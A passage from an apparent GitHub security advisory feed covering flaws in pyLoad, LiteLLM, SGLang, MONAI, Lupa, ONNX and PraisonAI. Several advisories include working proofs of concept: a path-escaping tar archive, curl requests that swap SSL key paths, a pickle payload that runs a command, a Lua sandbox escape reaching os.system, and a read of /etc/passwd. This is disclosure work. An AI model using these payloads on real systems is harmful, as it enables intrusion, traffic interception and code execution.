<pre><code class="language-python"># UnTar.py:10-22 — VULNERABLE implementation
def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
    def _is_within_directory(directory, target):
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        prefix = os.path.commonprefix([abs_directory, abs_target])  # BUG: line 14
        return prefix == abs_directory

    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")

    tar.extractall(path, members, numeric_owner=numeric_owner)
</code></pre>
<p><code>os.path.commonprefix()</code> is a <strong>string operation</strong>, not a path operation. For extraction destination <code>/downloads/pkg</code> and a malicious member <code>../pkg_evil/payload</code> (resolving to <code>/downloads/pkg_evil/payload</code>):</p>
<ul>
<li><code>commonprefix(['/downloads/pkg', '/downloads/pkg_evil/payload'])</code> → <code>'/downloads/pkg'</code> — <strong>equals the directory, check passes</strong></li>
<li><code>commonpath(['/downloads/pkg', '/downloads/pkg_evil/payload'])</code> → <code>'/downloads'</code> — <strong>does NOT equal the directory, check correctly fails</strong></li>
</ul>
<p>The extraction path is reached via: <code>ExtractArchive.package_finished()</code> (line 182) → <code>extract_queued()</code> → <code>UnTar.extract()</code> (line 76) → <code>_safe_extractall(t, self.dest)</code> (line 81).</p>
<h2 id="poc">PoC</h2>
<p>Self-contained proof of concept demonstrating the bypass:</p>
<pre><code class="language-python">import tarfile, io, os, shutil

dest = '/tmp/test_extraction_dir'
shutil.rmtree(dest, ignore_errors=True)
shutil.rmtree('/tmp/test_extraction_dir_pwned', ignore_errors=True)
os.makedirs(dest, exist_ok=True)

# Step 1: Create malicious tar with member that escapes via prefix trick
with tarfile.open('/tmp/evil.tar.gz', 'w:gz') as tar:
    info = tarfile.TarInfo(name='../test_extraction_dir_pwned/evil.txt')
    data = b'escaped the sandbox!'
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))

# Step 2: Reproduce the vulnerable check from UnTar.py:11-15
def _is_within_directory(directory, target):
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    prefix = os.path.commonprefix([abs_directory, abs_target])
    return prefix == abs_directory

# Step 3: Verify the check is bypassed
with tarfile.open('/tmp/evil.tar.gz') as tar:
    for member in tar.getmembers():
        member_path = os.path.join(dest, member.name)
        bypassed = _is_within_directory(dest, member_path)
        print(f'Member: {member.name}')
        print(f'Resolved: {os.path.abspath(member_path)}')
        print(f'Check passes (should be False): {bypassed}')
    tar.extractall(dest)

# Step 4: Confirm file was written outside extraction directory
escaped_file = '/tmp/test_extraction_dir_pwned/evil.txt'
assert os.path.exists(escaped_file), "File did not escape"
print(f'File escaped to: {escaped_file}')
print(f'Content: {open(escaped_file).read()}')
</code></pre>
<p>Output:</p>
<pre><code>Member: ../test_extraction_dir_pwned/evil.txt
Resolved: /tmp/test_extraction_dir_pwned/evil.txt
Check passes (should be False): True
File escaped to: /tmp/test_extraction_dir_pwned/evil.txt
Content: escaped the sandbox!
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who hosts a malicious <code>.tar.gz</code> archive on a file hosting service can write files to arbitrary sibling directories of the extraction path when a pyLoad user downloads and extracts the archive. This enables:</p>
<ul>
<li>Writing files outside the intended extraction directory into adjacent directories</li>
<li>Overwriting other users' downloads</li>
<li>Planting malicious files in predictable locations on disk</li>
<li>If combined with other primitives (e.g., writing a <code>.bashrc</code>, cron job, or plugin file), this could lead to code execution</li>
</ul>
<p>The attack requires the victim to download a malicious archive (either manually or via the pyLoad API with ADD permission) and have the ExtractArchive addon enabled.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Replace the broken inline <code>_is_within_directory</code> with the correct <code>is_within_directory</code> from <code>pyload.core.utils.fs</code>:</p>
<pre><code class="language-python">import os
import sys
import tarfile

from pyload.core.utils.fs import is_within_directory, safejoin
from pyload.plugins.base.extractor import ArchiveError, BaseExtractor, CRCError


# Fix for tarfile CVE-2007-4559
def _safe_extractall(tar, path=".", members=None, *, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):
            raise ArchiveError("Attempted Path Traversal in Tar File (CVE-2007-4559)")

    tar.extractall(path, members, numeric_owner=numeric_owner)
</code></pre>
<p>This removes the broken inline function and uses the already-existing correct implementation that was added in the GHSA-7g4m-8hx2-4qh3 fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-mvwx-582f-56r7">https://github.com/pyload/pyload/security/advisories/GHSA-mvwx-582f-56r7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35592">https://nvd.nist.gov/vuln/detail/CVE-2026-35592</a></li>
<li><a href="https://github.com/advisories/GHSA-mvwx-582f-56r7">https://github.com/advisories/GHSA-mvwx-582f-56r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvwx-582f-56r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:04:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] pyload-ng: Authorization Bypass for SSL Certificate/Key Configuration Due to Option Name Mismatch in pyload-ng]]></title>
        <id>https://github.com/advisories/GHSA-ppvx-rwh9-7rj7</id>
        <link href="https://github.com/advisories/GHSA-ppvx-rwh9-7rj7"/>
        <updated>2026-04-08T00:04:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>ADMIN_ONLY_CORE_OPTIONS</code> authorization set in <code>set_config_value()</code> uses incorrect option names <code>ssl_cert</code> and <code>ssl_key</code>, while the actual configuration option names are <code>ssl_certfile</code> and <code>ssl_keyfile</code>. This name mismatch causes the admin-only check to always evaluate to False, allowing any user with SETTINGS permission to overwrite the SSL certificate and key file paths. Additionally, the <code>ssl_certchain</code> option was never added to the admin-only set at all.</p>
<h2 id="details">Details</h2>
<p>The vulnerability is in <code>src/pyload/core/api/__init__.py</code>. The <code>ADMIN_ONLY_CORE_OPTIONS</code> set is defined at lines 237-248:</p>
<pre><code class="language-python">ADMIN_ONLY_CORE_OPTIONS = {
    ("general", "storage_folder"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "password"),
    ("proxy", "username"),
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "ssl_cert"),      # BUG: should be "ssl_certfile"
    ("webui", "ssl_key"),       # BUG: should be "ssl_keyfile"
    ("webui", "use_ssl"),
}
# NOTE: ("webui", "ssl_certchain") is entirely missing
</code></pre>
<p>The actual config option names are defined in <code>src/pyload/core/config/default.cfg:39-41</code>:</p>
<pre><code>file ssl_certfile : "SSL Certificate" = ssl.crt
file ssl_keyfile : "SSL Key" = ssl.key
file ssl_certchain : "CA's intermediate certificate bundle (optional)" =
</code></pre>
<p>The authorization check at line 267 compares the incoming <code>(category, option)</code> tuple against this set:</p>
<pre><code class="language-python">if (category, option) in ADMIN_ONLY_CORE_OPTIONS and not is_admin:
    self.pyload.log.error(...)
    return
</code></pre>
<p>When a request arrives with <code>option=ssl_certfile</code>, the check evaluates <code>("webui", "ssl_certfile") in ADMIN_ONLY_CORE_OPTIONS</code> which is <strong>False</strong> because the set contains <code>("webui", "ssl_cert")</code>, not <code>("webui", "ssl_certfile")</code>. The admin-only guard is bypassed and <code>config.set()</code> at line 271 proceeds to write the attacker-supplied value.</p>
<p>The value is cast as a <code>file</code> type in <code>parser.py:300-305</code>, which resolves it via <code>os.path.realpath()</code> but performs no further validation:</p>
<pre><code class="language-python">elif typ in ("file", "folder"):
    return (
        ""
        if value in (None, "")
        else os.path.realpath(os.path.expanduser(os.fsdecode(value)))
    )
</code></pre>
<p>On server restart with SSL enabled, the webserver loads the attacker-controlled paths (<code>webserver_thread.py:22-23,51-52</code>):</p>
<pre><code class="language-python">self.certfile = self.pyload.config.get("webui", "ssl_certfile")
self.keyfile = self.pyload.config.get("webui", "ssl_keyfile")
# ...
self.server.ssl_adapter = BuiltinSSLAdapter(
    self.certfile, self.keyfile, self.certchain
)
</code></pre>
<h2 id="poc">PoC</h2>
<p>Prerequisites: A pyLoad instance with SSL enabled and a non-admin user account that has SETTINGS permission.</p>
<p><strong>Step 1:</strong> Authenticate as the non-admin user to get a session cookie:</p>
<pre><code class="language-bash">curl -c cookies.txt -X POST 'http://localhost:8000/login' \
  -d 'username=settingsuser&amp;password=password123'
</code></pre>
<p><strong>Step 2:</strong> Set the SSL certificate to an attacker-controlled file path:</p>
<pre><code class="language-bash">curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_certfile": "/tmp/attacker.crt"}}'
</code></pre>
<p>Expected response: <code>true</code> (config saved successfully)</p>
<p><strong>Step 3:</strong> Set the SSL key to an attacker-controlled file path:</p>
<pre><code class="language-bash">curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_keyfile": "/tmp/attacker.key"}}'
</code></pre>
<p>Expected response: <code>true</code> (config saved successfully)</p>
<p><strong>Step 4:</strong> Set the SSL certificate chain (never protected):</p>
<pre><code class="language-bash">curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_certchain": "/tmp/attacker-chain.crt"}}'
</code></pre>
<p>Expected response: <code>true</code> (config saved successfully)</p>
<p><strong>Step 5:</strong> After the server restarts, it will load the attacker's certificate and key for all HTTPS connections.</p>
<h2 id="impact">Impact</h2>
<p>A non-admin user with SETTINGS permission can replace the SSL certificate and key used by the pyLoad HTTPS server. When the server restarts (or is restarted by an admin), it will serve HTTPS using the attacker's certificate/key pair. This enables:</p>
<ul>
<li><strong>Man-in-the-Middle attacks:</strong> The attacker, possessing the private key for the now-active certificate, can intercept and decrypt all HTTPS traffic to the pyLoad instance, including admin credentials and session tokens.</li>
<li><strong>Credential theft:</strong> All users (including admins) connecting over HTTPS will have their credentials exposed to the attacker.</li>
<li><strong>Configuration tampering:</strong> With intercepted admin credentials, the attacker can escalate to full admin access.</li>
</ul>
<p>The attack requires SSL to already be enabled by an admin (the <code>use_ssl</code> option is correctly protected), the attacker to place certificate/key files on the filesystem (potentially achievable via pyLoad's download functionality), and a server restart.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Fix the option names in <code>ADMIN_ONLY_CORE_OPTIONS</code> and add the missing <code>ssl_certchain</code> option in <code>src/pyload/core/api/__init__.py</code>:</p>
<pre><code class="language-python">ADMIN_ONLY_CORE_OPTIONS = {
    ("general", "storage_folder"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "password"),
    ("proxy", "username"),
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "ssl_certfile"),    # Fixed: was "ssl_cert"
    ("webui", "ssl_keyfile"),     # Fixed: was "ssl_key"
    ("webui", "ssl_certchain"),   # Added: was missing entirely
    ("webui", "use_ssl"),
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-ppvx-rwh9-7rj7">https://github.com/pyload/pyload/security/advisories/GHSA-ppvx-rwh9-7rj7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35586">https://nvd.nist.gov/vuln/detail/CVE-2026-35586</a></li>
<li><a href="https://github.com/advisories/GHSA-ppvx-rwh9-7rj7">https://github.com/advisories/GHSA-ppvx-rwh9-7rj7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ppvx-rwh9-7rj7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:04:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: Password hash exposure and pass-the-hash authentication bypass]]></title>
        <id>https://github.com/advisories/GHSA-69x8-hrgq-fjj8</id>
        <link href="https://github.com/advisories/GHSA-69x8-hrgq-fjj8"/>
        <updated>2026-04-08T00:04:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Three issues combine into a full authentication bypass chain:</p>
<ol>
<li>Weak hashing: User passwords are stored as unsalted SHA-256 hashes, making them vulnerable to rainbow table attacks and trivially identifying users with identical passwords.</li>
<li>Hash exposure: Multiple API endpoints (/user/info, /user/update, /spend/users) return the password hash field in responses to any authenticated user regardless of role. Plaintext passwords could also potentially be exposed in certain scenarios.</li>
<li>Pass-the-hash: The /v2/login endpoint accepts the raw SHA-256 hash as a valid password without re-hashing, allowing direct login with a stolen</li>
</ol>
<p>An already authenticated user can retrieve another user's password hash from the API and use it to log in as that user. This enables full privilege escalation in three HTTP requests.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in v1.83.0. Passwords are now hashed with scrypt (random 16-byte salt, n=16384, r=8, p=1). Password hashes are stripped from all API responses. Existing SHA-256 hashes are transparently migrated on next login.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-69x8-hrgq-fjj8">https://github.com/BerriAI/litellm/security/advisories/GHSA-69x8-hrgq-fjj8</a></li>
<li><a href="https://github.com/advisories/GHSA-69x8-hrgq-fjj8">https://github.com/advisories/GHSA-69x8-hrgq-fjj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69x8-hrgq-fjj8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-08T00:04:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLang's multimodal generation module is vulnerable to unauthenticated remote code execution through the ZMQ broker]]></title>
        <id>https://github.com/advisories/GHSA-rgq9-fqf5-fv58</id>
        <link href="https://github.com/advisories/GHSA-rgq9-fqf5-fv58"/>
        <updated>2026-04-07T22:14:25.000Z</updated>
        <content type="html"><![CDATA[<p>SGLang's multimodal generation module is vulnerable to unauthenticated remote code execution through the ZMQ broker, which deserializes untrusted data using pickle.loads() without authentication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sgl-project/sglang/security/advisories/GHSA-3cp7-c6q2-94xr">https://github.com/sgl-project/sglang/security/advisories/GHSA-3cp7-c6q2-94xr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3059">https://nvd.nist.gov/vuln/detail/CVE-2026-3059</a></li>
<li><a href="https://github.com/sgl-project/sglang/blob/main/python/sglang/multimodal_gen/runtime/scheduler_client.py">https://github.com/sgl-project/sglang/blob/main/python/sglang/multimodal_gen/runtime/scheduler_client.py</a></li>
<li><a href="https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>
<li><a href="https://github.com/sgl-project/sglang/pull/20904">https://github.com/sgl-project/sglang/pull/20904</a></li>
<li><a href="https://github.com/sgl-project/sglang/releases/tag/v0.5.10">https://github.com/sgl-project/sglang/releases/tag/v0.5.10</a></li>
<li><a href="https://github.com/advisories/GHSA-rgq9-fqf5-fv58">https://github.com/advisories/GHSA-rgq9-fqf5-fv58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgq9-fqf5-fv58</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-12T12:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLang's encoder parallel disaggregation system is vulnerable to unauthenticated remote code execution through the disaggregation module]]></title>
        <id>https://github.com/advisories/GHSA-jx93-g359-86wm</id>
        <link href="https://github.com/advisories/GHSA-jx93-g359-86wm"/>
        <updated>2026-04-07T22:14:15.000Z</updated>
        <content type="html"><![CDATA[<p>SGLang's encoder parallel disaggregation system is vulnerable to unauthenticated remote code execution through the disaggregation module, which deserializes untrusted data using pickle.loads() without authentication.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3060">https://nvd.nist.gov/vuln/detail/CVE-2026-3060</a></li>
<li><a href="https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/encode_receiver.py">https://github.com/sgl-project/sglang/blob/main/python/sglang/srt/disaggregation/encode_receiver.py</a></li>
<li><a href="https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>
<li><a href="https://github.com/sgl-project/sglang/pull/20904">https://github.com/sgl-project/sglang/pull/20904</a></li>
<li><a href="https://github.com/sgl-project/sglang/releases/tag/v0.5.10">https://github.com/sgl-project/sglang/releases/tag/v0.5.10</a></li>
<li><a href="https://github.com/advisories/GHSA-jx93-g359-86wm">https://github.com/advisories/GHSA-jx93-g359-86wm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jx93-g359-86wm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-12T12:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sglang] SGLangs `replay_request_dump.py` contains an insecure pickle.load() without validation and proper deserialization]]></title>
        <id>https://github.com/advisories/GHSA-hvwj-8w5g-28rg</id>
        <link href="https://github.com/advisories/GHSA-hvwj-8w5g-28rg"/>
        <updated>2026-04-07T22:14:05.000Z</updated>
        <content type="html"><![CDATA[<p>SGLangs <code>replay_request_dump.py</code> contains an insecure pickle.load() without validation and proper deserialization. An attacker can take advantage of this by providing a malicious .pkl file, which will execute the attackers code on the device running the script.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3989">https://nvd.nist.gov/vuln/detail/CVE-2026-3989</a></li>
<li><a href="https://github.com/sgl-project/sglang/blob/main/scripts/playground/replay_request_dump.py">https://github.com/sgl-project/sglang/blob/main/scripts/playground/replay_request_dump.py</a></li>
<li><a href="https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities">https://orca.security/resources/blog/sglang-llm-framework-rce-vulnerabilities</a></li>
<li><a href="https://github.com/sgl-project/sglang/pull/20904">https://github.com/sgl-project/sglang/pull/20904</a></li>
<li><a href="https://github.com/sgl-project/sglang/releases/tag/v0.5.10">https://github.com/sgl-project/sglang/releases/tag/v0.5.10</a></li>
<li><a href="https://github.com/advisories/GHSA-hvwj-8w5g-28rg">https://github.com/advisories/GHSA-hvwj-8w5g-28rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvwj-8w5g-28rg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-12T12:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[monai] MONAI: Unsafe functions lead to pickle deserialization rce]]></title>
        <id>https://github.com/advisories/GHSA-89gg-p5r5-q6r4</id>
        <link href="https://github.com/advisories/GHSA-89gg-p5r5-q6r4"/>
        <updated>2026-04-07T20:17:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>algo_from_pickle</code> function in <code>monai/auto3dseg/utils.py</code> causes <code>pickle.loads(data_bytes)</code> to be executed, and it does not perform any validation on the input parameters. This ultimately leads to insecure deserialization and can result in code execution vulnerabilities.</p>
<h3 id="details">Details</h3>
<p>poc</p>
<pre><code>import pickle
import subprocess
class MaliciousAlgo:
    def __reduce__(self):
        return (subprocess.call, (['calc.exe'],))
malicious_algo_bytes = pickle.dumps(MaliciousAlgo())

attack_data = {
    "algo_bytes": malicious_algo_bytes,  
     
}
attack_pickle_file = "attack_algo.pkl"
with open(attack_pickle_file, "wb") as f:
    f.write(pickle.dumps(attack_data))
</code></pre>
<p>Generate the malicious file "attack_algo.pkl" through POC.</p>
<pre><code>from monai.auto3dseg.utils import algo_from_pickle


attack_pickle_file = "attack_algo.pkl"
result = algo_from_pickle(attack_pickle_file)
</code></pre>
<p>Ultimately, it will trigger pickle.load through a file to identify the command execution.</p>
<img width="909" height="534" alt="image" src="https://github.com/user-attachments/assets/071adbb7-3e40-4651-be48-abd2ce32470f">

<p>Causes of the vulnerability:</p>
<pre><code>def algo_from_pickle(pkl_filename: str, template_path: PathLike | None = None, **kwargs: Any) -&gt; Any:

    with open(pkl_filename, "rb") as f_pi:
            data_bytes = f_pi.read()
        data = pickle.loads(data_bytes)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution</p>
<p>Repair suggestions
Verify the data source and content before deserializing, or use a safe deserialization method</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4">https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-89gg-p5r5-q6r4</a></li>
<li><a href="https://github.com/Project-MONAI/MONAI/releases/tag/1.5.2">https://github.com/Project-MONAI/MONAI/releases/tag/1.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-89gg-p5r5-q6r4">https://github.com/advisories/GHSA-89gg-p5r5-q6r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-89gg-p5r5-q6r4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T20:17:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lupa] Lupa has a Sandbox escape and RCE due to incomplete attribute_filter enforcement in getattr / setattr]]></title>
        <id>https://github.com/advisories/GHSA-69v7-xpr6-6gjm</id>
        <link href="https://github.com/advisories/GHSA-69v7-xpr6-6gjm"/>
        <updated>2026-04-07T15:48:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>attribute_filter</code> in the Lupa library is intended to restrict access to sensitive Python attributes when exposing objects to Lua.</p>
<p>However, the filter is not consistently applied when attributes are accessed through built-in functions like getattr and setattr. This allows an attacker to bypass the intended restrictions and eventually achieve arbitrary code execution.</p>
<h3 id="details">Details</h3>
<p>The <code>attribute_filter</code> is meant to block access to attributes such as <code>__class__</code>, <code>__mro__</code>, and similar internal properties.</p>
<p>In practice, it only applies to direct attribute access:</p>
<ul>
<li><code>obj.attr</code> → filtered</li>
<li><code>getattr(obj, "attr")</code> → not filtered
Because of this inconsistency, it’s possible to bypass the filter entirely, if access to the Python builtins is granted to Lua code.</li>
</ul>
<p>An attacker can use getattr to-</p>
<ul>
<li>Access <code>__class__</code></li>
<li>Walk the <code>__mro__</code> chain</li>
<li>Call <code>__subclasses__()</code></li>
<li>Iterate over available classes</li>
<li>Find a function that exposes <code>__globals__</code></li>
<li>Retrieve something like <code>os.system</code></li>
</ul>
<p>At that point, arbitrary command execution becomes straightforward.</p>
<p>This effectively breaks the security boundary that <code>attribute_filter</code> is expected to enforce.</p>
<h3 id="poc">PoC</h3>
<p>The following example shows how the filter can be bypassed to execute <code>os.system</code>:'</p>
<pre><code>import lupa
from lupa import LuaRuntime

def protected_attribute_filter(obj, attr_name, is_setting):
    if isinstance(attr_name, str) and attr_name.startswith('_'):
        raise AttributeError(f"Access to '{attr_name}' is forbidden")
    return attr_name

lua = LuaRuntime(unpack_returned_tuples=True, attribute_filter=protected_attribute_filter)

class UserProfile:
    def __init__(self, name): self.name = name

lua.globals().user = UserProfile("test")

lua.execute("""
local py = python.builtins
local getattr = py.getattr
local setattr = py.setattr

local cls = getattr(user, "__class__")
local _, obj_cls = getattr(cls, "__mro__")

local subs = getattr(obj_cls, "__subclasses__")()
for _, c in ipairs(subs) do
    if tostring(c):find("os._wrap_close") then
        local system = getattr(getattr(c, "__init__"), "__globals__")["system"]
        setattr(user, "run", system)
        user.run("id")
    end
end
""")
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who can execute Lua code can:</p>
<ul>
<li>Bypass the <code>attribute_filter</code></li>
<li>Access Python internals</li>
<li>Traverse the object graph</li>
<li>Reach execution primitives</li>
</ul>
<p>This leads to full sandbox escape and arbitrary command execution in the host Python process.
Any application relying on <code>attribute_filter</code> as a security control for untrusted Lua code execution is affected, if it does not also disallow access to the Python builtins via the <code>register_builtins=False</code> option.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scoder/lupa/security/advisories/GHSA-69v7-xpr6-6gjm">https://github.com/scoder/lupa/security/advisories/GHSA-69v7-xpr6-6gjm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34444">https://nvd.nist.gov/vuln/detail/CVE-2026-34444</a></li>
<li><a href="https://github.com/advisories/GHSA-69v7-xpr6-6gjm">https://github.com/advisories/GHSA-69v7-xpr6-6gjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69v7-xpr6-6gjm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T15:48:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[onnx] ONNX Untrusted Model Repository Warnings Suppressed by silent=True in onnx.hub.load() — Silent Supply-Chain Attack]]></title>
        <id>https://github.com/advisories/GHSA-hqmj-h5c6-369m</id>
        <link href="https://github.com/advisories/GHSA-hqmj-h5c6-369m"/>
        <updated>2026-04-06T23:11:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="whats-the-issue">What's the issue</h2>
<p>Passing <code>silent=True</code> to <code>onnx.hub.load()</code> kills all trust warnings and user prompts. This means a model can be downloaded from any unverified GitHub repo with zero user awareness.</p>
<pre><code class="language-python">if not _verify_repo_ref(repo) and not silent:
    # completely skipped when silent=True
    print("The model repo... is not trusted")
    if input().lower() != "y":
        return None
</code></pre>
<p>On top of that, the SHA256 integrity check is useless here — it validates against a manifest that lives in the same repo the attacker controls, so the hash will always match.</p>
<h2 id="impact">Impact</h2>
<p>Any pipeline using <code>hub.load()</code> with <code>silent=True</code> and an external repo string is silently loading whatever the repo owner ships. If that model executes arbitrary code on load, the attacker has access to the machine.</p>
<h2 id="resolved-by-removing-the-feature">Resolved by removing the feature</h2>
<h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md">Write-up</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m">https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m</a></li>
<li><a href="https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md">https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28500">https://nvd.nist.gov/vuln/detail/CVE-2026-28500</a></li>
<li><a href="https://github.com/advisories/GHSA-hqmj-h5c6-369m">https://github.com/advisories/GHSA-hqmj-h5c6-369m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqmj-h5c6-369m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:23:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI Has Path Traversal in FileTools]]></title>
        <id>https://github.com/advisories/GHSA-693f-pf34-72c5</id>
        <link href="https://github.com/advisories/GHSA-693f-pf34-72c5"/>
        <updated>2026-04-07T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="executive-summary">Executive Summary:</h3>
<p>The path validation has a critical logic bug: it checks for <code>..</code> AFTER <code>normpath()</code> has already collapsed all <code>..</code> sequences. This makes the check completely useless and allows trivial path traversal to any file on the system.
The path validation function also does not resolve the symlink wich could potentially cause path traversal.</p>
<h3 id="details">Details:</h3>
<p><code>_validate_path()</code> calls <code>os.path.normpath()</code> first, which collapses <code>..</code> sequences, then checks for <code>'..'</code> in normalized. Since <code>..</code> is already collapsed, the check always passes.</p>
<p><strong>Vulnerable File:</strong>
<code>src/praisonai-agents/praisonaiagents/tools/file_tools.py</code></p>
<p><strong>Lines:</strong>
42-49</p>
<pre><code class="language-python">class FileTools:
    """Tools for file operations including read, write, list, and information."""
    
    @staticmethod
    def _validate_path(filepath: str) -&gt; str:
        # Normalize the path
        normalized = os.path.normpath(filepath)
        absolute = os.path.abspath(normalized)
        
        # Check for path traversal attempts (.. after normalization)
        # We check the original input for '..' to catch traversal attempts
        if '..' in normalized:
            raise ValueError(f"Path traversal detected: {filepath}")
        
        return absolute
</code></pre>
<p><strong>Severity:</strong> CRITICAL</p>
<p><strong>CVSS v3.1:</strong> 9.2 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N</p>
<p><strong>CWE:</strong> CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</p>
<h3 id="proof-of-concept-poc">Proof of concept (PoC)</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li>Ability to specify a file path can call file operations</li>
</ul>
<p><strong>Steps to reproduce:</strong>
poc.py</p>
<pre><code class="language-python">from praisonaiagents.tools.file_tools import FileTools

print(FileTools._validate_path('/tmp/../etc/passwd'))
# Returns: /etc/passwd

print(FileTools.read_file('/tmp/../etc/passwd'))
# Returns: content of /etc/passwd
</code></pre>
<p><strong>Why this works:</strong></p>
